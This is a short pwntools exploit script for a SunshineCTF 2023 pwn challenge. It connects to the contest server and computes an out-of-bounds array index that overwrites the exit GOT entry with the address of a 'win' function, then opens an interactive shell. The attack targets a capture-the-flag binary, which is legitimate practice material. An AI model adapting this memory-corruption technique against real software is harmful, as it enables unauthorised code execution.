from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('sunshine')
r= e.process()
r = remote('chal.2023.sunshinectf.games', 23003)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')
win =0x40128F
fr = 0x405080
printf =0x4050D0
exit_got =0x405040
idx = (exit_got-fr)//8
r.sendline(str(idx))
pause()
r.sendlineafter(b"fruit >>>", p64(win))
r.interactive()
